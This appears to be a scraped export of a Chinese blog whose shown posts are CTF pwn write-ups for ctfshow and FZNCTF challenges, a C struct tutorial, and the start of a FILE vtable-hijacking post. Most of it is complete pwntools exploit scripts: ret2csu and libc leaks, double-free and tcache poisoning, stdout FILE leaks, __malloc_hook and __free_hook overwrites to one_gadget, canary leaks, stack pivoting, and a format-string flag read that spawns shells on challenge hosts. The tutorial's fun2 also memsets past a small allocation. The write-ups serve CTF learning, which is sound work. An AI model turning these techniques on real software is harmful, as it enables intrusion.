b&#x27;a&#x27;*0xa8+p64(fmt)+p64(0)*2        edit(p1.ljust(0x100,b&#x27;\\x00&#x27;))        p3 = b&#x27;w&#x27;*0x64 +p64(rdi)+p64(binsh)+p64(system)    psl(p3.ljust(0x100,b&#x27;a&#x27;))            #bug()        exp()p.interactive()\n\n修改v5 &#x3D; %256s\n00:0000│ rsp 0x7fffffffde48 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)... ↓        20 skipped15:00a8│-058 0x7fffffffdef0 —▸ 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27;的地址 */16:00b0│-050 0x7fffffffdef8 ◂— 0... ↓        9 skipped20:0100│ rbp 0x7fffffffdf48 —▸ 0x7fffffffdf00 ◂— 0 ;寻址是rbp-0x10所以要在0x7fffffffdef0布置&#x27;%256s&#x27;的地址\n\n RAX  0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */ ;后面会赋值给rdi RBX  0 RCX  0x7ffff72f73c0 (write+16) ◂— cmp rax, -0xfff RDX  0x7fffffffdeec ◂— 0x40161961616161 RDI  1*RSI  0x7fffffffdeec ◂— 0x40161961616161 R8   0x7ffff7fde700 ◂— 0x7ffff7fde700 R9   2 R10  0x6161616161616161 (&#x27;aaaaaaaa&#x27;) R11  0x246 R12  0x400a70 ◂— xor ebp, ebp R13  0x7fffffffe010 ◂— 1 R14  0 R15  0 RBP  0x7fffffffdf00 ◂— 0 ;注意此时rbp为0x7fffffffdf00 RSP  0x7fffffffdf58 —▸ 0x400eb0 ◂— push rbp*RIP  0x400f27 ◂— mov rdi, rax────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────   0x400f12    mov    eax, 0                       EAX =&gt; 0   0x400f17    call   printf@plt                  &lt;printf@plt&gt;    0x400f1c    lea    rdx, [rbp - 0x14]               RDX =&gt; 0x7fffffffdeec ◂— 0x40161961616161   0x400f20    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdef0] =&gt; 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */   0x400f24    mov    rsi, rdx                        RSI =&gt; 0x7fffffffdeec ◂— 0x40161961616161 ► 0x400f27    mov    rdi, rax                        RDI =&gt; 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */   0x400f2a    mov    eax, 0                          EAX =&gt; 0   0x400f2f    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;\n\n至于p2的偏移为什么是0x64，请看下文\n这是调试到我们修改完v5 &#x3D; %256s之后，rsp指向的返回地址为0x400f73,记住这rsp 0x7fffffffdf50\n\n继续执行到下一次读入选项\n\n此时我们读入的地址为0x7fffffffdeec,刚好0x7fffffffdf50-0x7fffffffdeec &#x3D; 0x64\nsi进去调到最后,可以看见此时的返回地址也是0x7fffffffdf50，所以偏移就是0x64\n0x7ffff726b646 &lt;__isoc99_scanf+358&gt;    ret                                &lt;0x40107a&gt;-------------------------------stack00:0000│ rsp 0x7fffffffdf50 —▸ 0x40107a ◂— pop rbx\n\n后面的话就是正常的ret2csu了就不讲了\n最后在贴一下exp\nfrom pwn import *from LibcSearcher import*context.log_level = &#x27;debug&#x27;psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda data : print(hex(data))uu64 = lambda : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))binary_name = &#x27;./pwn165&#x27;HOST = &quot;pwn.challenge.ctf.show&quot;PORT =  28191choice = input(&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;)if &quot;y&quot; in choice:    p = process(binary_name)elif &quot;n&quot; in choice:    p = remote(HOST,PORT)e = ELF(binary_name)def bug():    gdb.attach(p)    pause()# ========== Exploit 开始 ==========def cmd(data):    pc(&quot;&gt;&quot;)    psl(str(data))def edit(data):    cmd(1)    pc(&quot;Note:&quot;)    ps(data)    def show():    cmd(2)    def save():    cmd(3)def change(ID):    cmd(4)    pc(&quot;Input your ID:&quot;)    psl(str(ID))           def exp():    gadget1=0x401060    gadget2=0x40107a    rdi = 0x00000000401083    ret = 0x00000000004009b1    fmt = 0x401619    puts_plt = 0x400A00    puts_got = e.got[&#x27;puts&#x27;]    main = 0x400EB0        p.recvuntil(&quot;Input your ID:&quot;)    psl(str(&quot;jian&quot;))        print(&quot;\\033[5;32m[+]=====put the fmt into rbp-0x10=====\\033[0m&quot;)    p1 = b&#x27;a&#x27;*0xa8+p64(fmt)+p64(0)*2        edit(p1.ljust(0x100,b&#x27;\\x00&#x27;))        print(&quot;\\033[5;32m[+]=====start ret2csu=====\\033[0m&quot;)        p2 = b&#x27;b&#x27;*(0x64)+p64(gadget2)+p64(0)+p64(1)+p64(e.got[&#x27;puts&#x27;])+p64(0)+p64(0)+p64(e.got[&#x27;puts&#x27;])+p64(gadget1)+b&#x27;b&#x27;*(0x38)+p64(main)    psl(p2.ljust(0x100,b&#x27;a&#x27;))        print(&quot;\\033[5;32m[+]=====leak the libc=====\\033[0m&quot;)        puts_addr = uu64()    ph(puts_addr)    libc = ELF(&quot;./libc-2.23.so&quot;)    base = puts_addr - libc.sym[&quot;puts&quot;]    system = base + libc.sym[&quot;system&quot;]    binsh = base + next(libc.search(&quot;/bin/sh&quot;))    ph(base)    ph(system)    print(&quot;\\033[5;32m[+]=====get shell=====\\033[0m&quot;)        p.recvuntil(&quot;Input your ID:&quot;)    psl(str(&quot;jian&quot;))    p1 = b&#x27;a&#x27;*0xa8+p64(fmt)+p64(0)*2        edit(p1.ljust(0x100,b&#x27;\\x00&#x27;))        p3 = b&#x27;w&#x27;*0x64 +p64(rdi)+p64(binsh)+p64(system)    psl(p3.ljust(0x100,b&#x27;a&#x27;))            #bug()        exp()p.interactive()\n\n\n\nctfshow-pwn-164这是一道2.27的堆题\nmain:\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  sub_A5C(a1, a2, a3);  sub_AD0();  while ( 1 )  &#123;    menu();    v3 = his_read();    switch ( v3 )    &#123;      case 2:        delete();        break;      case 1433233:        transform();        break;      case 1:        add();        break;      default:        puts(&quot;Invalid Choice&quot;);        break;    &#125;  &#125;&#125;\n\nadd():\nunsigned __int64 add()&#123;  unsigned int size; // [rsp+4h] [rbp-Ch]  size_t size_4; // [rsp+8h] [rbp-8h]  size_4 = __readfsqword(0x28u);  puts(&quot;Size?&quot;);  size = his_read();  ptr = realloc(ptr, size);  puts(&quot;Content?&quot;);  read(0, ptr, size);  puts(&quot;Done&quot;);  return __readfsqword(0x28u) ^ size_4;&#125;\n\ndelete():\nunsigned __int64 sub_C2C()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  free(ptr);                                    // uaf  puts(&quot;Done&quot;);  return __readfsqword(0x28u) ^ v1;&#125;\n\ntransform:\nunsigned __int64 sub_9F9()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  if ( dword_202050 )    exit(-1);  dword_202050 = 1;  ptr = 0LL;  puts(&quot;Done&quot;);  return __readfsqword(0x28u) ^ v1;&#125;\n\n掌握的信息：\n\ndelete函数中存在uaf的，\n\nlibc为2.27最初的一版，可以直接double free，\n\n程序用realloc来申请chunk的。\n\ntransform可以把ptr&#x3D;0，但是只有一次机会\n\n\n这里先提一下realloc的特性：\n\n\n当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址\n当ptr != nullptr &amp;&amp; size == 0的时候，相当于free(ptr)，返回空指针\n当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去\n当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针\n\n\n根据realloc的特性我们可以将ptr&#x3D;0，达到申请多个chunk的目的，还可以进行溢出\n思路：\n\n先申请三个不同大小的chunk，chunk2为符合unsortedbin大小的chunk(我们得获取main_arena将其修改为IO_stdout),然后释放7次chunk2，填满tcachebins，然后释放将chunk2挂进unsortedbin中，使其与tcachebin重合\n然后申请回chunk1，将ptr-&gt;chunk1，这时扩展chunk1使其可以溢出到chunk2修改其fd指针为IO_stdout(后三位字节是不变的，运行exp得多试)将其挂进bins，随后将ptr清零，打tcachebins dup，修改stdout的flag和write_base泄露出libc\n与上面一样的方法打_free_hook-&gt;one_gadget\n\n在exp中有更详细的注释\nexp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda data : print(hex(data))p = process(&#x27;./pwn164&#x27;)e = ELF(&#x27;./pwn164&#x27;)#p = remote(&quot;pwn.challenge.ctf.show&quot;,28120)def bug():    gdb.attach(p)    pause()def cmd(choice):    pc(&quot;Choice:&quot;)    psl(str(choice))def add(size, content=b&#x27;\\xa0&#x27;):    cmd(1)    pc(&quot;Size?&quot;)    psl(str(size))        if size &gt; 0:        if content == b&#x27;\\xa0&#x27;:            pc(&quot;Content?&quot;)            ps(content)            return        pc(&quot;Content?&quot;)        ps(content)    def delete():    cmd(2)    def transform():\tcmd(1433233)def fill():\tadd(0x80,p64(0)+p64(0x1))\tdelete()\tdef exp():\tgadget=[0x4f2be,0x4f2c5,0x4f322,0x10a38c]\tmagic = 0x0FBAD1887\toffest = b&#x27;\\x60\\xc7&#x27;\tadd(0x20,b&#x27;aaaa&#x27;) # chunk1\tadd(0,b&#x27;&#x27;)\tadd(0x90,b&#x27;aaaa&#x27;) # chunk2\tadd(0,b&#x27;&#x27;)\tadd(0x10,p64(0)+p64(0x1)) # chunk3\tadd(0,b&#x27;&#x27;)   \tadd(0x90,p64(0)+p64(0x1)) # ptr-&gt;chunk2\tprint(&quot;\\x1B[5;31m[+]==========fill the tcachebins==========[+]\\x1B[0m&quot;)\t\tfor i in range(7):\t\tdelete()\tadd(0,b&#x27;&#x27;) #let the chunk2_addr in unsortedbins to get main arena and let the ptr = 0\tadd(0x20,b&#x27;1&#x27;) #apply the chunk1 back,ptr = chunk1_addr\t#chunks bu ju is :chunk1 0x31 chunk2 0xa1 chunk3 0x21 now\tprint(&quot;\\x1B[5;31m[+]==========leak the libc==========[+]\\x1B[0m&quot;)\t\tadd(0x60,p64(0)*5+p64(0x91)+offest) #chunk1 is 0x71 now filled it and yichu to change the main_arena to be the _IO_stdout_addr\tadd(0,b&#x27;&#x27;) # free chunk1 ptr =0\tadd(0x90,offest) # apply the tcachebin chunk this chunk --&gt; _IO_stdout, ptr = chunk2_addr\tadd(0,b&#x27;&#x27;)#_IO_list_stdout_addr is into tcachebins now,we need to make ptr =0, but we can&#x27;t change _IO_list_stdout &#x27;s bins,so this is why we need to change chunk2&#x27;size to 0x91. We aim to don&#x27;t break bins relationship\tbug()\tsleep(1)\tadd(0x90,p64(magic)+ p64(0) * 3 + p8(0x58))#IO ATTACK to leak the libc\t\t#pause()\t\tleak_libc = u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))\tph(leak_libc)\t\tlibc = ELF(&quot;./libc-2.27.so&quot;)\tbase = leak_libc - libc.sym[&#x27;_IO_file_jumps&#x27;]\tph(base)\togg = base + gadget[2]\tfree_hook = base + libc.sym[&#x27;__free_hook&#x27;]\t\tprint(&quot;\\x1B[5;31m[+]==========double free --&gt; free_hook --&gt; one_gadget==========[+]\\x1B[0m&quot;)\ttransform()#ptr =0\t\tadd(0x30,b&#x27;aaaa&#x27;)#this method is as above,i don&#x27;t explain more\tadd(0,b&#x27;&#x27;)\tadd(0xa0,b&#x27;aaaa&#x27;)\tadd(0,b&#x27;&#x27;)\tadd(0x10,b&#x27;aaaa&#x27;)\tadd(0,b&#x27;&#x27;)\tadd(0xa0,b&#x27;aaaa&#x27;)#da tcache bin dup\tfor i in range(7):\t    delete()\tadd(0,b&#x27;&#x27;)\tadd(0x30,b&#x27;aaaa&#x27;)\tadd(0x60,b&#x27;a&#x27;*0x38+p64(0x71)+p64(free_hook-0x8))\t#bug()\tadd(0)    \t#delete()\tadd(0xa0)\tadd(0)\tadd(0xa0,p64(0)+p64(ogg))\t#bug()\tdelete()\t\tp.interactive()\t\tif __name__ == &#x27;__main__&#x27;:    exp()\n\n参考链接：roarctf_2019_realloc_magic - LynneHuan - 博客园\nctfshow-pwn-163from pwn import*choice = input(&quot;please input yes or no ,yes is process no is remote!\\n&quot;)if &quot;y&quot; in choice:    p = process(&quot;./pwn163&quot;)elif &quot;n&quot; in choice :     p = remote(&quot;pwn.challenge.ctf.show&quot;,28292)libc = ELF(&quot;./libc-2.23.so&quot;)psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda data : print(hex(data))def bug():    gdb.attach(p)    pause()def cmd(choose):    pc(&quot;Command: &quot;)    psl(str(choose))def add(size):    cmd(1)    pc(&quot;Size: &quot;)    psl(str(size))def edit(idx,size,content):     cmd(2)    pc(&quot;Index: &quot;)       psl(str(idx))    pc(&quot;Size: &quot;)    psl(str(size))    pc(&quot;Content: &quot;)    ps(content)def delete(idx):    cmd(3)    pc(&quot;Index: &quot;)    psl(str(idx))def show(idx):    cmd(4)    pc(&quot;Index: &quot;)    psl(str(idx))    def exp():    print(&quot;\\x1B[5;31m[+]==start chunk overlapping==[+]\\x1B[0m&quot;)        add(0x10)#0    add(0x90)#1    add(0x90)#2    add(0x10)#3    edit(0,0x20,b&#x27;a&#x27;*0x10+p64(0)+p64(0x141))    delete(1)    add(0x90)#4    print(&quot;\\x1B[5;31m[+]==========leak the libc==========[+]\\x1B[0m&quot;)    show(2)    malloc_hook = u64(pc(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&quot;\\x00&quot;))-0x68    ph(malloc_hook)    base = malloc_hook-libc.sym[&quot;__malloc_hook&quot;]    free_hook = base+libc.sym[&quot;__free_hook&quot;]    realloc = base + libc.sym[&#x27;realloc&#x27;]    ph(realloc)    realloc_hook = malloc_hook - 0x8    ogg = [0x45216,0x4526a,0xf02a4,0xf1147]    ogg = base + ogg[1]    ph(base)    ph(ogg)    add(0x90)        add(0x68)#5           add(0x68)#6        delete(6)    delete(5)    pay = b&#x27;b&#x27;*0x10+p64(0)+p64(0x71)+p64(malloc_hook-0x23)    edit(3,len(pay),pay)        add(0x68)    add(0x68)    p1 = p64(0)+b&#x27;\\x00\\x00\\x00&#x27;+p64(ogg)+p64(realloc+10)    edit(6,len(p1),p1)            #bug()    add(0x10)          p.interactive()    exp()\n\nctfshow-pwn-162exp:\nfrom pwn import*context(log_level=&#x27;debug&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28154)#p = process(&#x27;./pwn162&#x27;)ph = lambda data : print(hex(data))def add(size,name):    p.recvuntil(&quot;Your choice : &quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(&quot;size of the daniu&#x27;s name: &quot;)    p.sendline(str(size))    p.recvuntil(&quot;daniu&#x27;s name:&quot;)    p.send(name)    p.recvuntil(&quot;daniu&#x27;s message:&quot;)    p.sendline(b&#x27;xxxx&#x27;)def add2(p1):    p.recvuntil(&quot;Your choice : &quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(&quot;size of the daniu&#x27;s name: &quot;)    p.sendline(str(0x68))    p.recvuntil(&quot;daniu&#x27;s name:&quot;)    p.send(p1)def delete(idx):    p.recvuntil(&quot;Your choice : &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(&quot;daniu&#x27;s index:&quot;)    p.sendline(str(idx))      def bug():    gdb.attach(p)    pause()offest = 0xa55add(0x20,b&#x27;jian&#x27;)#0add(0x68,b&#x27;lian&#x27;)#1add(0x68,b&#x27;lian&#x27;)#2add(0x7f,b&#x27;jian&#x27;)#3add(0x18,b&#x27;jian&#x27;)#4#add(0x7f,b&#x27;jian&#x27;,b&#x27;aaaa&#x27;)#4delete(0)delete(3)#delete(0)#add(0x7f,b&#x27;\\xee&#x27;,b&#x27;wt1122f&#x27;)add(0x60,b&#x27;\\xdd\\x25&#x27;)#add(0x20,p64(0x00000000202020),b&#x27;add&#x27;)delete(1)delete(2)delete(1)#double freeadd(0x68,b&#x27;\\xd0&#x27;)add(0x68,b&#x27;\\xd0&#x27;) add(0x68,b&#x27;\\xd0&#x27;)add(0x68,b&#x27;\\xd0&#x27;)p1=b&#x27;a&#x27;*(51)+p64(0xfbad1800)+p64(0)*3+b&#x27;\\x00&#x27;add2(p1)_IO_2_1_stderr_192 = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = ELF(&quot;./libc-2.23(64).so&quot;)print(hex(_IO_2_1_stderr_192)) base = _IO_2_1_stderr_192 - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]-192ph(base)realloc = base + libc.sym[&#x27;realloc&#x27;]malloc_hook = base + libc.sym[&#x27;__malloc_hook&#x27;]fake_chunk = malloc_hook - 0x23ph(malloc_hook)p.recv()p.sendline(b&#x27;xxxx&#x27;)one_gadgets = [0x45216,0x4526a]ogg = one_gadgets[0] +base delete(1)delete(2)delete(1)add(0x68,p64(fake_chunk))add(0x68,p64(fake_chunk))add(0x68,p64(fake_chunk))p2 = b&#x27;a&#x27;*(0x13-0x8)+p64(0) +p64(ogg)add(0x68,p2)p.recvuntil(&quot;Your choice : &quot;)p.sendline(b&#x27;1&#x27;)p.sendline(&#x27;cat flag&#x27;)#bug()p.interactive()            \n\n","categories":["PWN"],"tags":["刷题"]},{"title":"C中结构体之指针与数组杂谈","url":"//about/links/2025/11/16/C%E4%B8%AD%E7%BB%93%E6%9E%84%E4%BD%93%E4%B9%8B%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84","content":"C中结构体之指针与数组#include &lt;iostream&gt;#include &lt;conio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;using namespace std;// 今天描述结构体中的指针和数组typedef struct _Player&#123;    int level;    char name[20];&#125; Player, *PPplayer;// 上面这个第一个结构体里面成员在内存中是连续的void fun1()&#123;    PPplayer p1 = (PPplayer)malloc(sizeof(Player)); // 为p1申请内存    memset(p1, 0, sizeof(Player));                  // 初始化    p1-&gt;level = 1;    strcpy(p1-&gt;name, &quot;张三&quot;);    cout &lt;&lt; &quot;p1-&gt;level:&quot; &lt;&lt; p1-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p1-&gt;name:&quot; &lt;&lt; p1-&gt;name &lt;&lt; endl;    free(p1);    p1 = NULL;&#125;typedef struct _Player2&#123;    int level;    char *name; // name是一个指针&#125; Player2, *PPplayer2;// 上面这个结构体里面成员在内存中是不连续的void fun2()&#123;    PPplayer2 p2 = (PPplayer2)malloc(sizeof(Player2)); // 为p2申请内存    memset(p2, 0, sizeof(Player2));                    // 初始化    p2-&gt;level = 1;    p2-&gt;name = (char *)malloc(strlen(&quot;1angx&quot;) + 1); // 为name申请内存,这里用了strlen()函数，最后的\\x00的大小没有加上去，所以要加个1    memset(p2-&gt;name, 0, 20);                        // 初始化    strcpy(p2-&gt;name, &quot;1angx&quot;);    cout &lt;&lt; &quot;p2-&gt;level:&quot; &lt;&lt; p2-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p2-&gt;name:&quot; &lt;&lt; p2-&gt;name &lt;&lt; endl;    // free(p2-&gt;name);    free(p2);    p2 = NULL;&#125;typedef struct _Player3&#123;    int level;    char name[1]; // 这里给name的大小为1个字节，我们等会会在fun3函数中说明为何&#125; Player3, *PPplayer3;void fun3()&#123;    PPplayer3 p3 = (PPplayer3)malloc(sizeof(Player3) + strlen(&quot;1angx&quot;)); // 为p3申请内存，同时加上我们的name的大小，这里因为我们数组的大小是1所以不需要再加上1了    memset(p3, 0, sizeof(Player3) + strlen(&quot;1angx&quot;));                    // 初始化    p3-&gt;level = 1;    strcpy(p3-&gt;name, &quot;1angx&quot;); // 这里我们直接给name赋值是不是越界访问了，确实是，但是由于在结构体中内存是连续的，name在结构体中，我们的结构体的大小足够大，且level name的内存是连续的    cout &lt;&lt; &quot;p3-&gt;level:&quot; &lt;&lt; p3-&gt;level &lt;&lt; endl;    cout &lt;&lt; &quot;p3-&gt;name:&quot; &lt;&lt; p3-&gt;name &lt;&lt; endl;    free(p3);    p3 = NULL;    puts(&quot;fun3中，我们就实现了内存连续，且大小为动态的name&quot;);    puts(&quot;我们通过‘越界访问’实现了这一要求&quot;);&#125;int main()&#123;    fun1(); // fun1中确实是利用数组实现了角色名称的创建，但是大小是固定的，不能动态改变    putchar(&#x27;\\n&#x27;);    fun2(); // fun2中利用指针实现了角色名称的创建，大小是动态的，但是内存是不连续的    putchar(&#x27;\\n&#x27;);    puts(&quot;那我们怎么实现大小是动态的，其在内存空间中的大小也是动态的？\\n&quot;);    puts(&quot;答案：fun3\\n&quot;);    fun3();    return 0;&#125;\n\n","categories":["C/C++"],"tags":["结构体"]},{"title":"FZNCTF-Langx-PWN-WP","url":"//about/links/2025/11/16/FZNCTF-PWN-WP","content":"FZNCTF-Langx-PWN-WPfmt\n格式化字符串漏洞\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  int fd; // [rsp+4h] [rbp-24Ch]  char buf[48]; // [rsp+10h] [rbp-240h] BYREF  char format[520]; // [rsp+40h] [rbp-210h] BYREF  unsigned __int64 v7; // [rsp+248h] [rbp-8h]  v7 = __readfsqword(0x28u);  init_func(argc, argv, envp);  puts(&quot;Welcome to FZNCTF!&quot;);  puts(&quot;lizimi is waiting for you...&quot;);  puts(&quot;what do you want to say to him?&quot;);  puts(&quot;please input:&quot;);  fd = open(&quot;flag&quot;, 0);  if ( fd == -1 )  &#123;    perror(&quot;open flag failed&quot;);    exit(1);  &#125;  read(fd, buf, 0x30uLL);  close(fd);  read(0, format, 0x200uLL);  printf(format);  return 0;&#125;\n\n程序首先会打开flag文件并读到栈上，本地调试可知偏移为7(64位格式化字符串)\nexp:\nfrom pwn import *#p = process(&quot;./attachment&quot;)p = remote(&quot;nc1.ctfplus.cn&quot;,11882)context.log_level = &#x27;debug&#x27;#gdb.attach(p)p.recvuntil(&quot;please input:&quot;)p1 = b&#x27;%7$s&#x27;p.sendline(p1)p.interactive()\n\nbird\n开了金丝雀(canary)\n\n分析关键函数\nunsigned int vuln()&#123;  int i; // [esp+4h] [ebp-74h]  char buf[100]; // [esp+8h] [ebp-70h] BYREF  unsigned int v3; // [esp+6Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  puts(&quot;What a cute canary!!!!!&quot;);  puts(&quot;Maybe the canary is a string of numbers?&quot;);  puts(&quot;Can you guess the number?&quot;);  for ( i = 0; i &lt;= 1; ++i )  &#123;    read(0, buf, 0x200u);    printf(&quot;number %s&quot;, buf);    if ( !strncmp(buf, &quot;114514&quot;, 6u) ) //ctf经典数字      Right(); //没有什么用  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\nprintf(&quot;number %s&quot;, buf);这一步我们可以泄露canary\n泄露canary直接返回到后门getshell\nexp:\nfrom pwn import*#p = process(&quot;./canary&quot;)p = remote(&quot;nc1.ctfplus.cn&quot;,27529)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)def bug():\tgdb.attach(p)\tpause()\t\tdef exp():\tpc(&quot;Can you guess the number?&quot;)\toffest = 0x70 -0xc\tp0 = b&#x27;a&#x27;*offest\t#bug()\tpsl(p0)#sendline多发送一个0xa--&gt;&#x27;\\n&#x27;\tshell = 0x8049285\tp.recvuntil(b&#x27;a&#x27;*offest)\tcanary = u32(p.recv(4)) -0xa #所以这里直接减去0xa即可，因为canary最后一个字节也是00所以不用管\t\tpsl(b&#x27;a&#x27;*offest + p32(canary)+b&#x27;a&#x27;*0xC+p32(shell)) #getshell\tp.interactive()\texp()\t\t\t\n\nstack_pivotingx64\nssize_t vuln()&#123;  char buf[48]; // [rsp+0h] [rbp-30h] BYREF  puts(&quot;now let&#x27;s start to play!\\n&quot;);  puts(&quot;please give me your name\\n&quot;);  read(0, buf, 0x50uLL);  printf(&quot;your name is %s\\n&quot;, buf);  puts(&quot;give me some other message\\n&quot;);  return read(0, buf, 0x50uLL);&#125;\n\n程序存在栈溢出，但溢出长度不够，直接打栈迁移\nprintf(&quot;your name is %s\\n&quot;, buf);\n\n这一步泄露rbp地址，然后提前在栈中布置我们的rop链，存在堆栈不平衡加个ret,后面直接栈迁移\nexp:\nfrom pwn import*a=input(&quot;yes is process ,no is remote:&quot;)if &quot;y&quot; in a:\tp = process(&quot;./stack_pivotingx64&quot;)elif &quot;n&quot; in a:\tp =remote(&quot;nc1.ctfplus.cn&quot;,19747)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)def bug():\tgdb.attach(p)\tpause()\tdef exp():\trdi=0x0000000000401275\tsystem = 0x40126a\tmagic = 0x401256\tpc(&quot;please give me your name\\n&quot;)\t\tp0 = b&#x27;a&#x27;*0x30\tps(p0)\tpc(b&#x27;a&#x27;*0x30)\trbp = u64(p.recv(6)[-6::].ljust(8,b&#x27;\\x00&#x27;))-0x10\trsp = rbp-0x30\tbinsh =rsp+32\tph(rbp)\t#bug()\tp1=p64(0)+p64(rdi)+p64(binsh)+p64(system)+b&#x27;/bin/sh\\x00&#x27;+p64(magic+1)+p64(rsp)+p64(magic) #magic+1为ret\tpc(&quot;give me some other message\\n&quot;)\tps(p1)\tp.interactive()exp()\t\n\nezuaf\n保护全开\n\n存在uaf，不存在栈溢出\nint del()&#123;  int v0; // eax  void *v1; // rdi  puts(&quot;idx?&quot;);  v0 = get_int();  if ( v0 &lt; 0 )    return puts(&quot;invalid&quot;);  if ( num &lt;= v0 )    return puts(&quot;invalid&quot;);  v1 = (void *)heap[v0];  if ( !v1 )    return puts(&quot;invalid&quot;);  free(v1);//指针未置零  return puts(&quot;delete done&quot;);&#125;\n\nint show()&#123;  int v0; // eax  __int64 v1; // rbx  puts(&quot;idx?&quot;);  v0 = get_int();  if ( v0 &lt; 0 )    return puts(&quot;invalid&quot;);  if ( num &lt;= v0 )    return puts(&quot;invalid&quot;);  v1 = v0;  if ( !heap[v0] )    return puts(&quot;invalid&quot;);  write(1, &quot;content: &quot;, 9uLL);  write(1, (const void *)heap[v1], sizes[v1]);  return write(1, &quot;\\n&quot;, 1uLL);&#125;\n\n思路：先释放0x400的chunk挂进unsortedbin,通过uaf+show计算出libc基地址，打tcache_double_free，将malloc_hook填为one_gadget,用realloc来调节栈帧getshell\nexp:\nfrom pwn import*a=input(&quot;yes is process ,no is remote:&quot;)if &quot;y&quot; in a:\tp = process(&quot;./pwn&quot;)elif &quot;n&quot; in a:\tp =remote(&quot;nc1.ctfplus.cn&quot;,31004)e = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)context.log_level = &#x27;debug&#x27;psl = lambda data :p.sendline(data)ps = lambda data : p.send(data)ph = lambda data : print(hex(data))pc = lambda data : p.recvuntil(data)uu64 = lambda  : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))def bug():\tgdb.attach(p)\tpause()def cmd(choice):\tpc(&quot;5. exit&quot;)\tpsl(str(choice))def add(size,content):\tcmd(1)\tpc(&quot;size?&quot;)\tpsl(str(size))\tpc(&quot;content:&quot;)\tpsl(content)\tdef delete(idx):\tcmd(2)\tpc(&quot;idx?&quot;)\tpsl(str(idx))def show(idx):\tcmd(3)\tpc(&quot;idx?&quot;)\tpsl(str(idx))\t\tdef edit(idx,content):\tcmd(4)\tpc(&quot;idx?&quot;)\tpsl(str(idx))\tpc(&quot;content:&quot;)\tps(content)\t\t\t\tdef exp(i):\tadd(0x410,b&#x27;jian&#x27;)#0\tadd(0x410,b&#x27;1angx&#x27;)#1\tdelete(0)\tshow(0)\tmalloc_hook = uu64()-0X70\tbase = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]\trealloc = base  + libc.sym[&#x27;realloc&#x27;]\trealloc_hook = malloc_hook -0x8\togg_offest = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]\togg = base +ogg_offest[0]\tph(base)\tadd(0x40,b&#x27;1angx&#x27;)#2\tdelete(2)\tp1= b&#x27;a&#x27;*8+p64(0x114514)\tedit(2,p1)\tdelete(2)\tedit(2,p64(realloc_hook))\tadd(0x40,b&#x27;1angx&#x27;)\t#bug()\tadd(0x40,p64(ogg)+p64(realloc+i))\tcmd(1)\tpc(&quot;size?&quot;)\tpsl(str(0x10))\tp.interactive()\t\texp(2)\t\n\n","categories":["PWN"],"tags":["WP"]},{"title":"IO利用之伪造 Vtable 劫持程序流程","url":"//about/links/2025/11/15/IO%E5%88%A9%E7%94%A8%E4%B9%8B%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B","content":"IO利用之伪造 vtable 劫持程序流程建议学习的前置知识：\n\n-&gt;Linux下I&#x2F;O库中的FILE结构&#x2F;\n-&gt;_IO_FILE_plus结构\n\n概述\nLinux中的一些常见的IO操作函数都要经过FILE结构处理，其中_IO_FILE_plus结构中存在vtable，而某些函数会取出vtable中的指针进行调用\nstruct _IO_FILE_plus&#123;  FILE file;  const struct _IO_jump_t *vtable;&#125;;\n\n根据上述，我们可以通过伪造 _IO_FILE_plus 的 vtable 